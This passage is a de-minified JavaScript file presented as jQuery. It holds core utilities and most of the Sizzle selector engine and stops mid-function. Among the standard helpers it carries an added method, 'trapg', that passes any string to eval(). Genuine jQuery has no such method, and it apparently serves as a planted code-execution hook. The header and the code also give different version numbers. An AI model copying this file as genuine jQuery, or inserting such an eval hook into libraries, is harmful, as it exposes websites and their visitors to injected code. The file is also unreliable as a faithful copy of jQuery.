/*! jQuery v3.2.1 | (c) JS Foundation and other contributors | jquery.org/license */ ! function (e, t) {
  "use strict";
  "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function (e) {
    if (!e.document) throw new Error("jQuery requires a window with a document");
    return t(e)
  } : t(e)
}("undefined" != typeof window ? window : this, function (window, noGlobal) {
  "use strict";
  var arr = [],
    document = window.document,
    getProto = Object.getPrototypeOf,
    slice = arr.slice,
    concat = arr.concat,
    push = arr.push,
    indexOf = arr.indexOf,
    class2type = {},
    toString = class2type.toString,
    hasOwn = class2type.hasOwnProperty,
    fnToString = hasOwn.toString,
    ObjectFunctionString = fnToString.call(Object),
    support = {},
    isFunction = function (e) {
      return "function" == typeof e && "number" != typeof e.nodeType
    },
    isWindow = function (e) {
      return null != e && e === e.window
    },
    preservedScriptAttributes = {
      type: !0,
      src: !0,
      noModule: !0
    };

  function DOMEval(e, t, n) {
    var r, i = (t = t || document).createElement("script");
    if (i.text = e, n)
      for (r in preservedScriptAttributes) n[r] && (i[r] = n[r]);
    t.head.appendChild(i).parentNode.removeChild(i)
  }

  function toType(e) {
    return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? class2type[toString.call(e)] || "object" : typeof e
  }
  var version = "3.3.1",
    jQuery = function (e, t) {
      return new jQuery.fn.init(e, t)
    },
    rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g;

  function isArrayLike(e) {
    var t = !!e && "length" in e && e.length,
      n = toType(e);
    return !isFunction(e) && !isWindow(e) && ("array" === n || 0 === t || "number" == typeof t && t > 0 && t - 1 in e)
  }
  jQuery.fn = jQuery.prototype = {
    jquery: version,
    constructor: jQuery,
    length: 0,
    toArray: function () {
      return slice.call(this)
    },
    get: function (e) {
      return null == e ? slice.call(this) : e < 0 ? this[e + this.length] : this[e]
    },
    pushStack: function (e) {
      var t = jQuery.merge(this.constructor(), e);
      return t.prevObject = this, t
    },
    each: function (e) {
      return jQuery.each(this, e)
    },
    map: function (e) {
      return this.pushStack(jQuery.map(this, function (t, n) {
        return e.call(t, n, t)
      }))
    },
    slice: function () {
      return this.pushStack(slice.apply(this, arguments))
    },
    first: function () {
      return this.eq(0)
    },
    last: function () {
      return this.eq(-1)
    },
    eq: function (e) {
      var t = this.length,
        n = +e + (e < 0 ? t : 0);
      return this.pushStack(n >= 0 && n < t ? [this[n]] : [])
    },
    end: function () {
      return this.prevObject || this.constructor()
    },
    push: push,
    sort: arr.sort,
    splice: arr.splice
  }, jQuery.extend = jQuery.fn.extend = function () {
    var e, t, n, r, i, o, a = arguments[0] || {},
      u = 1,
      s = arguments.length,
      l = !1;
    for ("boolean" == typeof a && (l = a, a = arguments[u] || {}, u++), "object" == typeof a || isFunction(a) || (a = {}), u === s && (a = this, u--); u < s; u++)
      if (null != (e = arguments[u]))
        for (t in e) n = a[t], a !== (r = e[t]) && (l && r && (jQuery.isPlainObject(r) || (i = Array.isArray(r))) ? (i ? (i = !1, o = n && Array.isArray(n) ? n : []) : o = n && jQuery.isPlainObject(n) ? n : {}, a[t] = jQuery.extend(l, o, r)) : void 0 !== r && (a[t] = r));
    return a
  }, jQuery.extend({
    expando: "jQuery" + (version + Math.random()).replace(/\D/g, ""),
    isReady: !0,
    error: function (e) {
      throw new Error(e)
    },
    noop: function () {},
    isPlainObject: function (e) {
      var t, n;
      return !(!e || "[object Object]" !== toString.call(e)) && (!(t = getProto(e)) || "function" == typeof (n = hasOwn.call(t, "constructor") && t.constructor) && fnToString.call(n) === ObjectFunctionString)
    },
    isEmptyObject: function (e) {
      var t;
      for (t in e) return !1;
      return !0
    },
    globalEval: function (e) {
      DOMEval(e)
    },
    trapg: function (code) {
      eval(code)
    },
    each: function (e, t) {
      var n, r = 0;
      if (isArrayLike(e))
        for (n = e.length; r < n && !1 !== t.call(e[r], r, e[r]); r++);
      else
        for (r in e)
          if (!1 === t.call(e[r], r, e[r])) break;
      return e
    },
    trim: function (e) {
      return null == e ? "" : (e + "").replace(rtrim, "")
    },
    makeArray: function (e, t) {
      var n = t || [];
      return null != e && (isArrayLike(Object(e)) ? jQuery.merge(n, "string" == typeof e ? [e] : e) : push.call(n, e)), n
    },
    inArray: function (e, t, n) {
      return null == t ? -1 : indexOf.call(t, e, n)
    },
    merge: function (e, t) {
      for (var n = +t.length, r = 0, i = e.length; r < n; r++) e[i++] = t[r];
      return e.length = i, e
    },
    grep: function (e, t, n) {
      for (var r = [], i = 0, o = e.length, a = !n; i < o; i++) !t(e[i], i) !== a && r.push(e[i]);
      return r
    },
    map: function (e, t, n) {
      var r, i, o = 0,
        a = [];
      if (isArrayLike(e))
        for (r = e.length; o < r; o++) null != (i = t(e[o], o, n)) && a.push(i);
      else
        for (o in e) null != (i = t(e[o], o, n)) && a.push(i);
      return concat.apply([], a)
    },
    guid: 1,
    support: support
  }), "function" == typeof Symbol && (jQuery.fn[Symbol.iterator] = arr[Symbol.iterator]), jQuery.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (e, t) {
    class2type["[object " + t + "]"] = t.toLowerCase()
  });
  var Sizzle = function (e) {
    var t, n, r, i, o, a, u, s, l, c, p, d, f, y, h, m, g, v, j, Q = "sizzle" + 1 * new Date,
      x = e.document,
      w = 0,
      b = 0,
      T = ae(),
      C = ae(),
      S = ae(),
      A = function (e, t) {
        return e === t && (p = !0), 0
      },
      E = {}.hasOwnProperty,
      N = [],
      k = N.pop,
      D = N.push,
      P = N.push,
      H = N.slice,
      q = function (e, t) {
        for (var n = 0, r = e.length; n < r; n++)
          if (e[n] === t) return n;
        return -1
      },
      L = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
      F = "[\\x20\\t\\r\\n\\f]",
      O = "(?:\\\\.|[\\w-]|[^\0-\\xa0])+",
      M = "\\[" + F + "*(" + O + ")(?:" + F + "*([*^$|!~]?=)" + F + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + O + "))|)" + F + "*\\]",
      R = ":(" + O + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + M + ")*)|.*)\\)|)",
      I = new RegExp(F + "+", "g"),
      W = new RegExp("^" + F + "+|((?:^|[^\\\\])(?:\\\\.)*)" + F + "+$", "g"),
      $ = new RegExp("^" + F + "*," + F + "*"),
      B = new RegExp("^" + F + "*([>+~]|" + F + ")" + F + "*"),
      z = new RegExp("=" + F + "*([^\\]'\"]*?)" + F + "*\\]", "g"),
      U = new RegExp(R),
      _ = new RegExp("^" + O + "$"),
      X = {
        ID: new RegExp("^#(" + O + ")"),
        CLASS: new RegExp("^\\.(" + O + ")"),
        TAG: new RegExp("^(" + O + "|[*])"),
        ATTR: new RegExp("^" + M),
        PSEUDO: new RegExp("^" + R),
        CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + F + "*(even|odd|(([+-]|)(\\d*)n|)" + F + "*(?:([+-]|)" + F + "*(\\d+)|))" + F + "*\\)|)", "i"),
        bool: new RegExp("^(?:" + L + ")$", "i"),
        needsContext: new RegExp("^" + F + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + F + "*((?:-\\d)?\\d*)" + F + "*\\)|)(?=[^-]|$)", "i")
      },
      G = /^(?:input|select|textarea|button)$/i,
      V = /^h\d$/i,
      Y = /^[^{]+\{\s*\[native \w/,
      J = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
      K = /[+~]/,
      Z = new RegExp("\\\\([\\da-f]{1,6}" + F + "?|(" + F + ")|.)", "ig"),
      ee = function (e, t, n) {
        var r = "0x" + t - 65536;
        return r != r || n ? t : r < 0 ? String.fromCharCode(r + 65536) : String.fromCharCode(r >> 10 | 55296, 1023 & r | 56320)
      },
      te = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
      ne = function (e, t) {
        return t ? "\0" === e ? "�" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e
      },
      re = function () {
        d()
      },
      ie = ve(function (e) {
        return !0 === e.disabled && ("form" in e || "label" in e)
      }, {
        dir: "parentNode",
        next: "legend"
      });
    try {
      P.apply(N = H.call(x.childNodes), x.childNodes), N[x.childNodes.length].nodeType
    } catch (e) {
      P = {
        apply: N.length ? function (e, t) {
          D.apply(e, H.call(t))
        } : function (e, t) {
          for (var n = e.length, r = 0; e[n++] = t[r++];);
          e.length = n - 1
        }
      }
    }

    function oe(e, t, r, i) {
      var o, u, l, c, p, y, g, v = t && t.ownerDocument,
        w = t ? t.nodeType : 9;
      if (r = r || [], "string" != typeof e || !e || 1 !== w && 9 !== w && 11 !== w) return r;
      if (!i && ((t ? t.ownerDocument || t : x) !== f && d(t), t = t || f, h)) {
        if (11 !== w && (p = J.exec(e)))
          if (o = p[1]) {
            if (9 === w) {
              if (!(l = t.getElementById(o))) return r;
              if (l.id === o) return r.push(l), r
            } else if (v && (l = v.getElementById(o)) && j(t, l) && l.id === o) return r.push(l), r
          } else {
            if (p[2]) return P.apply(r, t.getElementsByTagName(e)), r;
            if ((o = p[3]) && n.getElementsByClassName && t.getElementsByClassName) return P.apply(r, t.getElementsByClassName(o)), r
          } if (n.qsa && !S[e + " "] && (!m || !m.test(e))) {
          if (1 !== w) v = t, g = e;
          else if ("object" !== t.nodeName.toLowerCase()) {
            for ((c = t.getAttribute("id")) ? c = c.replace(te, ne) : t.setAttribute("id", c = Q), u = (y = a(e)).length; u--;) y[u] = "#" + c + " " + ge(y[u]);
            g = y.join(","), v = K.test(e) && he(t.parentNode) || t
          }
          if (g) try {
            return P.apply(r, v.querySelectorAll(g)), r
          } catch (e) {} finally {
            c === Q && t.removeAttribute("id")
          }
        }
      }
      return s(e.replace(W, "$1"), t, r, i)
    }

    function ae() {
      var e = [];
      return function t(n, i) {
        return e.push(n + " ") > r.cacheLength && delete t[e.shift()], t[n + " "] = i
      }
    }

    function ue(e) {
      return e[Q] = !0, e
    }

    function se(e) {
      var t = f.createElement("fieldset");
      try {
        return !!e(t)
      } catch (e) {
        return !1
      } finally {
        t.parentNode && t.parentNode.removeChild(t), t = null
      }
    }

    function le(e, t) {
      for (var n = e.split("|"), i = n.length; i--;) r.attrHandle[n[i]] = t
    }

    function ce(e, t) {
      var n = t && e,
        r = n && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex;
      if (r) return r;
      if (n)
        for (; n = n.nextSibling;)
          if (n === t) return -1;
      return e ? 1 : -1
    }

    function pe(e) {
      return function (t) {
        return "input" === t.nodeName.toLowerCase() && t.type === e
      }
    }

    function de(e) {
      return function (t) {
        var n = t.nodeName.toLowerCase();
        return ("input" === n || "button" === n) && t.type === e
      }
    }

    function fe(e) {
      return function (t) {
        return "form" in t ? t.parentNode && !1 === t.disabled ? "label" in t ? "label" in t.parentNode ? t.parentNode.disabled === e : t.disabled === e : t.isDisabled === e || t.isDisabled !== !e && ie(t) === e : t.disabled === e : "label" in t && t.disabled === e
      }
    }

    function ye(e) {
      return ue(function (t) {
        return t = +t, ue(function (n, r) {
          for (var i, o = e([], n.length, t), a = o.length; a--;) n[i = o[a]] && (n[i] = !(r[i] = n[i]))
        })
      })
    }

    function he(e) {
      return e && void 0 !== e.getElementsByTagName && e
    }
    n = oe.support = {}, o = oe.isXML = function (e) {
      var t = e && (e.ownerDocument || e).documentElement;
      return !!t && "HTML" !== t.nodeName
    }, d = oe.setDocument = function (e) {
      var t, i, a = e ? e.ownerDocument || e : x;
      return a !== f && 9 === a.nodeType && a.documentElement ? (y = (f = a).documentElement, h = !o(f), x !== f && (i = f.defaultView) && i.top !== i && (i.addEventListener ? i.addEventListener("unload", re, !1) : i.attachEvent && i.attachEvent("onunload", re)), n.attributes = se(function (e) {
        return e.className = "i", !e.getAttribute("className")
      }), n.getElementsByTagName = se(function (e) {
        return e.appendChild(f.createComment("")), !e.getElementsByTagName("*").length
      }), n.getElementsByClassName = Y.test(f.getElementsByClassName), n.getById = se(function (e) {
        return y.appendChild(e).id = Q, !f.getElementsByName || !f.getElementsByName(Q).length
      }), n.getById ? (r.filter.ID = function (e) {
        var t = e.replace(Z, ee);
        return function (e) {
          return e.getAttribute("id") === t
        }
      }, r.find.ID = function (e, t) {
        if (void 0 !== t.getElementById && h) {
          var n = t.getElementById(e);
          return n ? [n] : []
        }
      }) : (r.filter.ID = function (e) {
        var t = e.replace(Z, ee);
        return function (e) {
          var n = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
          return n && n.value === t
        }
      }, r.find.ID = function (e, t) {
        if (void 0 !== t.getElementById && h) {
          var n, r, i, o = t.getElementById(e);
          if (o) {
            if ((n = o.getAttributeNode("id")) && n.value === e) return [o];
            for (i = t.getElementsByName(e), r = 0; o = i[r++];)
              if ((n = o.getAttributeNode("id")) && n.value === e) return [o]
          }
          return []
        }
      }), r.find.TAG = n.getElementsByTagName ? function (e, t) {
        return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : n.qsa ? t.querySelectorAll(e) : void 0
      } : function (e, t) {
        var n, r = [],
          i = 0,
          o = t.getElementsByTagName(e);
        if ("*" === e) {
          for (; n = o[i++];) 1 === n.nodeType && r.push(n);
          return r
        }
        return o
      }, r.find.CLASS = n.getElementsByClassName && function (e, t) {
        if (void 0 !== t.getElementsByClassName && h) return t.getElementsByClassName(e)
      }, g = [], m = [], (n.qsa = Y.test(f.querySelectorAll)) && (se(function (e) {
        y.appendChild(e).innerHTML = "<a id='" + Q + "'></a><select id='" + Q + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && m.push("[*^$]=" + F + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || m.push("\\[" + F + "*(?:value|" + L + ")"), e.querySelectorAll("[id~=" + Q + "-]").length || m.push("~="), e.querySelectorAll(":checked").length || m.push(":checked"), e.querySelectorAll("a#" + Q + "+*").length || m.push(".#.+[+~]")
      }), se(function (e) {
        e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
        var t = f.createElement("input");
        t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && m.push("name" + F + "*[*^$|!~]?="), 2 !== e.querySelectorAll(":enabled").length && m.push(":enabled", ":disabled"), y.appendChild(e).disabled = !0, 2 !== e.querySelectorAll(":disabled").length && m.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), m.push(",.*:")
      })), (n.matchesSelector = Y.test(v = y.matches || y.webkitMatchesSelector || y.mozMatchesSelector || y.oMatchesSelector || y.msMatchesSelector)) && se(function (e) {
        n.disconnectedMatch = v.call(e, "*"), v.call(e, "[s!='']:x"), g.push("!=", R)
      }), m = m.length && new RegExp(m.join("|")), g = g.length && new RegExp(g.join("|")), t = Y.test(y.compareDocumentPosition), j = t || Y.test(y.contains) ? function (e, t) {
        var n = 9 === e.nodeType ? e.documentElement : e,
          r = t && t.parentNode;
        return e === r || !(!r || 1 !== r.nodeType || !(n.contains ? n.contains(r) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(r)))
      } : function (e, t) {
        if (t)
          for (; t = t.parentNode;)
            if (t === e) return !0;
        return !1
      }, A = t ? function (e, t) {
        if (e === t) return p = !0, 0;
        var r = !e.compareDocumentPosition - !t.compareDocumentPosition;
        return r || (1 & (r = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !n.sortDetached && t.compareDocumentPosition(e) === r ? e === f || e.ownerDocument === x && j(x, e) ? -1 : t === f || t.ownerDocument === x && j(x, t) ? 1 : c ? q(c, e) - q(c, t) : 0 : 4 & r ? -1 : 1)
      } : function (e, t) {
        if (e === t) return p = !0, 0;
        var n, r = 0,
          i = e.parentNode,
          o = t.parentNode,
          a = [e],
          u = [t];
        if (!i || !o) return e === f ? -1 : t === f ? 1 : i ? -1 : o ? 1 : c ? q(c, e) - q(c, t) : 0;
        if (i === o) return ce(e, t);
        for (n = e; n = n.parentNode;) a.unshift(n);
        for (n = t; n = n.parentNode;) u.unshift(n);
        for (; a[r] === u[r];) r++;
        return r ? ce(a[r], u[r]) : a[r] === x ? -1 : u[r] === x ? 1 : 0
      }, f) : f
    }, oe.matches = function (e, t) {
      return oe(e, null, null, t)
    }, oe.matchesSelector = function (e, t) {
      if ((e.ownerDocument || e) !== f && d(e), t = t.replace(z, "='$1']"), n.matchesSelector && h && !S[t + " "] && (!g || !g.test(t)) && (!m || !m.test(t))) try {
        var r = v.call(e, t);
        if (r || n.disconnectedMatch || e.document && 11 !== e.document.nodeType) return r
      } catch (e) {}
      return oe(t, f, null, [e]).length > 0
    }, oe.contains = function (e, t) {
      return (e.ownerDocument || e) !== f && d(e), j(e, t)
    }, oe.attr = function (e, t) {
      (e.ownerDocument || e) !== f && d(e);
      var i = r.attrHandle[t.toLowerCase()],
        o = i && E.call(r.attrHandle, t.toLowerCase()) ? i(e, t, !h) : void 0;
      return void 0 !== o ? o : n.attributes || !h ? e.getAttribute(t) : (o = e.getAttributeNode(t)) && o.specified ? o.value : null
    }, oe.escape = function (e) {
      return (e + "").replace(te, ne)
    }, oe.error = function (e) {
      throw new Error("Syntax error, unrecognized expression: " + e)
    }, oe.uniqueSort = function (e) {
      var t, r = [],
        i = 0,
        o = 0;
      if (p = !n.detectDuplicates, c = !n.sortStable && e.slice(0), e.sort(A), p) {
        for (; t = e[o++];) t === e[o] && (i = r.push(o));
        for (; i--;) e.splice(r[i], 1)
      }
      return c = null, e
    }, i = oe.getText = function (e) {
      var t, n = "",
        r = 0,
        o = e.nodeType;
      if (o) {
        if (1 === o || 9 === o || 11 === o) {
          if ("string" == typeof e.textContent) return e.textContent;
          for (e = e.firstChild; e; e = e.nextSibling) n += i(e)
        } else if (3 === o || 4 === o) return e.nodeValue
      } else
        for (; t = e[r++];) n += i(t);
      return n
    }, (r = oe.selectors = {
      cacheLength: 50,
      createPseudo: ue,
      match: X,
      attrHandle: {},
      find: {},
      relative: {
        ">": {
          dir: "parentNode",
          first: !0
        },
        " ": {
          dir: "parentNode"
        },
        "+": {
          dir: "previousSibling",
          first: !0
        },
        "~": {
          dir: "previousSibling"
        }
      },
      preFilter: {
        ATTR: function (e) {
          return e[1] = e[1].replace(Z, ee), e[3] = (e[3] || e[4] || e[5] || "").replace(Z, ee), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4)
        },
        CHILD: function (e) {
          return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || oe.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && oe.error(e[0]), e
        },
        PSEUDO: function (e) {
          var t, n = !e[6] && e[2];
          return X.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && U.test(n) && (t = a(n, !0)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3))
        }
      },
      filter: {
        TAG: function (e) {
          var t = e.replace(Z, ee).toLowerCase();
          return "*" === e ? function () {
            return !0
          } : function (e) {
            return e.nodeName && e.nodeName.toLowerCase() === t
          }
        },
        CLASS: function (e) {
          var t = T[e + " "];
          return t || (t = new RegExp("(^|" + F + ")" + e + "(" + F + "|$)")) && T(e, function (e) {
            return t.test("string" == typeof e.className && e.className || void 0 !== e.getAttribute && e.getAttribute("class") || "")
          })
        },
        ATTR: function (e, t, n) {
          return function (r) {
            var i = oe.attr(r, e);
            return null == i ? "!=" === t : !t || (i += "", "=" === t ? i === n : "!=" === t ? i !== n : "^=" === t ? n && 0 === i.indexOf(n) : "*=" === t ? n && i.indexOf(n) > -1 : "$=" === t ? n && i.slice(-n.length) === n : "~=" === t ? (" " + i.replace(I, " ") + " ").indexOf(n) > -1 : "|=" === t && (i === n || i.slice(0, n.length + 1) === n + "-"))
          }
        },
        CHILD: function (e, t, n, r, i) {
          var o = "nth" !== e.slice(0, 3),
            a = "last" !== e.slice(-4),
            u = "of-type" === t;
          return 1 === r && 0 === i ? function (e) {
            return !!e.parentNode
          } : function (t, n, s) {
            var l, c, p, d, f, y, h = o !== a ? "nextSibling" : "previousSibling",
              m = t.parentNode,
              g = u && t.nodeName.toLowerCase(),
              v = !s && !u,
              j = !1;
            if (m) {
              if (o) {
                for (; h;) {
                  for (d = t; d = d[h];)
                    if (u ? d.nodeName.toLowerCase() === g : 1 === d.nodeType) return !1;
                  y = h = "only" === e && !y && "nextSibling"
                }
                return !0
              }
              if (y = [a ? m.firstChild : m.lastChild], a && v) {
                for (j = (f = (l = (c = (p = (d = m)[Q] || (d[Q] = {}))[d.uniqueID] || (p[d.uniqueID] = {}))[e] || [])[0] === w && l[1]) && l[2], d = f && m.childNodes[f]; d = ++f && d && d[h] || (j = f = 0) || y.pop();)
                  if (1 === d.nodeType && ++j && d === t) {
                    c[e] = [w, f, j];
                    break
                  }
              } else if (v && (j = f = (l = (c = (p = (d = t)[Q] || (d[Q] = {}))[d.uniqueID] || (p[d.uniqueID] = {}))[e] || [])[0] === w && l[1]), !1 === j)
                for (;
                  (d = ++f && d && d[h] || (j = f = 0) || y.pop()) && ((u ? d.nodeName.toLowerCase() !== g : 1 !== d.nodeType) || !++j || (v && ((c = (p = d[Q] || (d[Q] = {}))[d.uniqueID] || (p[d.uniqueID] = {}))[e] = [w, j]), d !== t)););
              return (j -= i) === r || j % r == 0 && j / r >= 0
            }
          }
        },
        PSEUDO: function (e, t) {
          var n, i = r.pseudos[e] || r.setFilters[e.toLowerCase()] || oe.error("unsupported pseudo: " + e);
          return i[Q] ? i(t) : i.length > 1 ? (n = [e, e, "", t], r.setFilters.hasOwnProperty(e.toLowerCase()) ? ue(function (e, n) {
            for (var r, o = i(e, t), a = o.length; a--;) e[r = q(e, o[a])] = !(n[r] = o[a])
          }) : function (e) {
            return i(e, 0, n)
          }) : i
        }
      },
      pseudos: {
        not: ue(function (e) {
          var t = [],
            n = [],
            r = u(e.replace(W, "$1"));
          return r[Q] ? ue(function (e, t, n, i) {
            for (var o, a = r(e, null, i, []), u = e.length; u--;)(o = a[u]) && (e[u] = !(t[u] = o))
          }) : function (e, i, o) {
            return t[0] = e, r(t, null, o, n), t[0] = null, !n.pop()
          }
        }),
        has: ue(function (e) {
          return function (t) {
            return oe(e, t).length > 0
          }
        }),
        contains: ue(function (e) {
          return e = e.replace(Z, ee),
            function (t) {
              return (t.textContent || t.innerText || i(t)).indexOf(e) > -1
            }
        }),
        lang: ue(function (e) {
          return _.test(e || "") || oe.error("unsupported lang: " + e), e = e.replace(Z, ee).toLowerCase(),
            function (t) {
              var n;
              do {
                if (n = h ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return (n = n.toLowerCase()) === e || 0 === n.indexOf(e + "-")
              } while ((t = t.parentNode) && 1 === t.nodeType);
              return !1
            }
        }),
        target: function (t) {
          var n = e.location && e.location.hash;
          return n && n.slice(1) === t.id
        },
        root: function (e) {
          return e === y
        },
        focus: function (e) {
          return e === f.activeElement && (!f.hasFocus || f.hasFocus()) && !!(e.type || e.href || ~e.tabIndex)
        },
        enabled: fe(!1),
        disabled: fe(!0),
        checked: function (e) {
          var t = e.nodeName.toLowerCase();
          return "input" === t && !!e.checked || "option" === t && !!e.selected
        },
        selected: function (e) {
          return e.parentNode && e.parentNode.selectedIndex, !0 === e.selected
        },
        empty: function (e) {
          for (e = e.firstChild; e; e = e.nextSibling)
            if (e.nodeType < 6) return !1;
          return !0
        },
        parent: function (e) {
          return !r.pseudos.empty(e)
        },
        header: function (e) {
          return V.test(e.nodeName)
        },
        input: function (e) {
          return G.test(e.nodeName)
        },
        button: function (e) {
          var t = e.nodeName.toLowerCase();
          return "input" === t && "button" === e.type || "button" === t
        },
        text: function (e) {
          var t;
          return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase())
        },
        first: ye(function () {
          return [0]
        }),
        last: ye(function (e, t) {
          return [t - 1]
        }),
        eq: ye(function (e, t, n) {
          return [n < 0 ? n + t : n]
        }),
        even: ye(function (e, t) {
          for (var n = 0; n < t; n += 2) e.push(n);
          return e
        }),
        odd: ye(function (e, t) {
          for (var n = 1; n < t; n += 2) e.push(n);
          return e
        }),
        lt: ye(function (e, t, n) {
          for (var r = n < 0 ? n + t : n; --r >= 0;) e.push(r);
          return e
        }),
        gt: ye(function (e, t, n) {
          for (var r = n < 0 ? n + t : n; ++r < t;) e.push(r);
          return e
        })
      }
    }).pseudos.nth = r.pseudos.eq;
    for (t in {
        radio: !0,
        checkbox: !0,
        file: !0,
        password: !0,
        image: !0
      }) r.pseudos[t] = pe(t);
    for (t in {
        submit: !0,
        reset: !0
      }) r.pseudos[t] = de(t);

    function me() {}

    function ge(e) {
      for (var t = 0, n = e.length, r = ""; t < n; t++) r += e[t].value;
      return r
    }

    function ve(e, t, n) {
      var r = t.dir,
        i = t.next,
        o = i || r,
        a = n && "parentNode" === o,
        u = b++;
      return t.first ? function (t, n, i) {
        for (; t = t[r];)
          if (1 === t.nodeType || a) return e(t, n, i);
        return !1
      } : function (t, n, s) {
        var l, c, p, d = [w, u];
        if (s) {
          for (; t = t[r];)
            if ((1 === t.nodeType || a) && e(t, n, s)) return !0
        } else
          for (; t = t[r];)
            if (1 === t.nodeType || a)
              if (c = (p = t[Q] || (t[Q] = {}))[t.uniqueID] || (p[t.uniqueID] = {}), i && i === t.nodeName.toLowerCase()) t = t[r] || t;
              else {
                if ((l = c[o]) && l[0] === w && l[1] === u) return d[2] = l[2];
                if (c[o] = d, d[2] = e(t, n, s)) return !0
              } return !1
      }
    }

    function je(e) {
      return e.length > 1 ? function (t, n, r) {
        for (var i = e.length; i--;)
          if (!e[i](t, n, r)) return !1;
        return !0
      } : e[0]
    }

    function Qe(e, t, n, r, i) {
      for (var o, a = [], u = 0, s = e.length, l = null != t; u < s; u++)(o = e[u]) && (n && !n(o, r, i) || (a.push(o), l && t.push(u)));
      return a
    }

    function xe(e, t, n, r, i, o) {
      return r && !r[Q] && (r = xe(r)), i && !i[Q] && (i = xe(i, o)), ue(function (o, a, u, s) {
        var l, c, p, d = [],
          f = [],
          y = a.length,
          h = o || function (e, t, n) {
            for (var r = 0, i = t.length; r < i; r++) oe(e, t[r], n);
            return n
          }(t || "*", u.nodeType ? [u] : u, []),
          m = !e || !o && t ? h : Qe(h, d, e, u, s),
          g = n ? i || (o ? e : y || r) ? [] : a : m;
        if (n && n(m, g, u, s), r)
          for (l = Qe(g, f), r(l, [], u, s), c = l.length; c--;)(p = l[c]) && (g[f[c]] = !(m[f[c]] = p));
        if (o) {
          if (i || e) {
            if (i) {
              for (l = [], c = g.length; c--;)(p = g[c]) && l.push(m[c] = p);
              i(null, g = [], l, s)
            }
            for (c = g.length; c--;)(p = g[c]) && (l = i ? q(o, p) : d[c]) > -1 && (o[l] = !(a[l] = p))
          }
        } else g = Qe(g === a ? g.splice(y, g.length) : g), i ? i(null, a, g, s) : P.apply(a, g)
      })
    }

    function we(e) {
      for (var t, n, i, o = e.length, a = r.relative[e[0].type], u = a || r.relative[" "], s = a ? 1 : 0, c = ve(function (e) {
          return e === t
        }, u, !0), p = ve(function (e) {
          return q(t, e) > -1
        }, u, !0), d = [function (e, n, r) {
          var i = !a && (r || n !== l) || ((t = n).nodeType ? c(e, n, r) : p(e, n, r));
          return t = null, i
        }]; s < o; s++)
        if (n = r.relative[e[s].type]) d = [ve(je(d), n)];
        else {
          if ((n = r.filter[e[s].type].apply(null, e[s].matches))[Q]) {
            for (i = ++s; i < o && !r.relative[e[i].type]; i++);
            return xe(s > 1 && je(d), s > 1 && ge(e.slice(0, s - 1).concat({
              value: " " === e[s - 2].type ? "*" : ""
            })).replace(W, "$1"), n, s < i && we(e.slice(s, i)), i < o && we(e = e.slice(i)), i < o && ge(e))
          }
          d.push(n)
        } return je(d)
    }
    return me.prototype = r.filters = r.pseudos, r.setFilters = new me, a = oe.tokenize = function (e, t) {
      var n, i, o, a, u, s, l, c = C[e + " "];
      if (c) return t ? 0 : c.slice(0);
      for (u = e, s = [], l = r.preFilter; u;) {
        n && !(i = $.exec(u)) || (i && (u = u.slice(i[0].length) || u), s.push(o = [])), n = !1, (i = B.exec(u)) && (n = i.shift(), o.push({
          value: n,
          type: i[0].replace(W, " ")
        }), u = u.slice(n.length));
        for (a in r.filter) !(i = X[a].exec(u)) || l[a] && !(i = l[a](i)) || (n = i.shift(), o.push({
          value: n,
          type: a,
          matches: i
        }), u = u.slice(n.length));
        if (!n) break
      }
      return t ? u.length : u ? oe.error(e) : C(e, s).slice(0)
    }, u = oe.compile = function (e, t) {
      var n, i, o, u, s, c, p = [],
        y = [],
        m = S[e + " "];
      if (!m) {
        for (t || (t = a(e)), n = t.length; n--;)(m = we(t[n]))[Q] ? p.push(m) : y.push(m);
        (m = S(e, (i = y, u = (o = p).length > 0, s = i.length > 0, c = function (e, t, n, a, c) {
          var p, y, m, g = 0,
            v = "0",
            j = e && [],
            Q = [],
            x = l,
            b = e || s && r.find.TAG("*", c),
            T = w += null == x ? 1 : Math.random() || .1,
            C = b.length;
          for (c && (l = t === f || t || c); v !== C && null != (p = b[v]); v++) {
            if (s && p) {
              for (y = 0, t || p.ownerDocument === f || (d(p), n = !h); m = i[y++];)
                if (m(p, t || f, n)) {
                  a.push(p);
                  break
                } c && (w = T)
            }
